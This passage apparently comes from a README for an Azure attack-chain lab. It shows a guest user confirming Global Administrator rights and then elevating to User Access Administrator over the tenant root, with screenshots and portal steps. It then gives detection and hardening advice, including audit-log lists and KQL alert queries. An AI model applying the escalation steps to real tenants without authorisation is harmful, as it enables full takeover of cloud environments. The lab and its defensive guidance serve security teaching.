## **Authenticated (Global Administrator in the Azure AD Tenant)**

#### **Tools used**
> [Azure Portal](https://portal.azure.com)

### 22. We can confirm our newly granted role by logging into our own guest user

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/Guest%20user%20is%20GA.png?raw=true)

### 23. With our freshly delegated privilege role, we elevate ourself to "User Access Administrator" on Tenant Root Management group, and by then grant ourself complete ownership of the entire Azure resource environment

*Azure Active Directory > Properties > Access management for Azure resources > "Yes" and save*

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/elevate%20as%20user%20access%20administrator.png?raw=true)

## **Authenticated (User Access Administrator)**

#### **Tools used**
> PowerShell, [Az Module](https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-7.1.0)

### 24. User Access Administrator confirmation
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/Guest%20user%20as%20user%20access%20administrator.png?raw=true)
  
  
  
# Detection and improving security
The following section will describe how you can minimize your Azure attack surface and detect if attacks like this has happend in your environment.  

## Introduction
Almost the entire attack chain can either be detected with native Azure components and third-party products, or prevented by following a secure configuration baseline and best practice architecture design and implementation.

We do not support nor recommend any specific product, but we highly recommend any organisation develop and create a roadmap to create proper detection while also protecting their cloud infrastructure.

We do recommend that organisations enable all applicable audit and diagnostic features in Azure, and as a bare minimum ingest those logs into a Log Analytics Workspace, Microsoft Sentinel, or to a third-party SIEM product through an Event Hub. The following audit logs and diagnostic settings should be enabled and shipped as a bare minimum:

- Azure AD
  - Audit Logs
  - Sign in logs
  - Non interactive user sign in logs
  - Service Principal sign in logs
  - Managed Identity sign in logs
  - ADFS Sign in logs
  - Risky users
  - User risk events
- Azure Monitor (Management Plane)
  - Administrative
  - Security
  - Alert
  - Policy

These services are a part of the fundamental foundation of your tenant and Azure resources, and contains all the necessary information of your security principals (users, groups, and service principals), Azure AD joined or Hybrid-joined devices, and resources.

On top of that, we highly recommend enabling diagnostic logs on all applicable resources in your environment, and ship those logs as well. Such resources could include:

- Key vaults
- Web apps and function apps
- Storage accounts
- Virtual Machines
- SQL servers and databases
- Automation accounts

## **Unauthenticated**

### Improving security
1. Do not expose any data to the internet from an public available storage account, unless the data should be in its nature (think pictures for a website)
2. Restrict access through selected networks (preferably on the VNET level), or even better use private endpoints
3. Enforce secure transfer and set minimum TLS version to 1.2 on all storage accounts
4. Rotate access keys every 90 days, and take advantage of the granular roles for RBAC, such as "Storage Blob Data Reader" and "Storage File Data SMB Share Reader"
5. Enforce Azure Multi-factor authentication on ALL users regardless of their roles and privileges. We recommend enabling a session policy for 8 hours through a Conditional Access Policy, enabling the users to only get an MFA challenge once each day
6. Restrict Azure and Microsoft 365 corporate access through Conditional Access Policies. These requirements should as a bare minimum require device compliance

## **Authenticated (Reader)**

### Detection
1. Enable Defender for Resource Manager in the Defender for Cloud suite. This will create alerts when automated off the shelf tools as Microburst and PowerZure are utilized against your tenant
3. Alert when guest invitations are being sent, and again if the invitiation has been accepted
4. Alert for service principal sign-ins from unfamiliar locations and resource, such as PowerShell

### Improving security
1. Do not scope any groups with Dynamic Group Membership to any priviliged RBAC permission or Azure AD Role. Furthermore, try not to create any membership that rule relies on attributes regular users can determine or manipulate
2. Do not allow regular users to invite guest users into the organisations tenant, leave that to tenant admins and specific Azure AD Roles. Consider configuring the collaboration restrictions to exclusively allow invitations from specific domains if applicable. This can obviously be counter productive for some organisations.
3. Delegate Virtual Machine Contributor to specific Resource Groups, rather than than the entire subscription. Follow least privilege and segrerate your infrastructure into landing zones
4. Do not store plaintext credentials and secrets in runbooks, or in code in general. Utilized Managed Identities from Automation Accounts
5. Do proper governance and inventory of your external/guest accounts that has been invited into your tenant. If you have Azure AD Premium P2, leverage from Access Reviews and automate this task
  
## **Authenticated (Virtual Machine Contributor on Subscription)**

### Detection

1. Query and alert for run commands initiated on virtual machines. KQL example query:
```text
    AzureActivity
    | where OperationName == "Run Command on Virtual Machine"
    | where ActivityStatus has_any ("Succeeded", "Accepted")
    | project TimeGenerated,
        Resource,
        ResourceGroup,
        Caller,
        CallerIpAddress,
        ActivityStatus
```
2. Alert on newly added credentials to an exisiting app registration (Enterprise Application/Service Principal)

### Improving security
1. Configure Conditional Access Policies that allows access to Microsoft Azure Management exclusively from compliant- or hybrid azure ad joined devices
2. Apply least privilege and configure the Storage Account Contributor access specifically to the Storage Account(s), or Resource Group as needed
3. Do not store other resources, such as additional Storage Accounts in the same Resource Group as the cloud shell Storage Account
4. Enforce Azure Multi-factor authentication on all regular and privilege users, including this "AppOwner"

## **Authenticated (Storage Account Contributor on Management Group)**

### Detection
1. Always alert when a security principal gets delegated the Global Administrator role, or any of the other privileged Azure AD roles. Could be from a normal direct assignment, or an Eligible assignment through Azure AD Privilege Identity Management

### Improving security
1. Awareness about internal phishing campaign. This Teams message was sent from a service principal with a shortened link, this should raise red flags at the recipient

## **Authenticated (Global Administrator in the Azure AD tenant)**

### Detection
1. Create a custom alert in Defender for Cloud Apps for when a Global Administrator elevates to User Access Administrator. Look for the activity type:
```text
Azure operation = ElevateAccess Microsoft.Authorization
```

### Improving security
1. Configure Conditional Access Policies that only allows access to Microsoft Azure Management exclusively from a dedicated cloud PAW (Privileged Access Workstation)
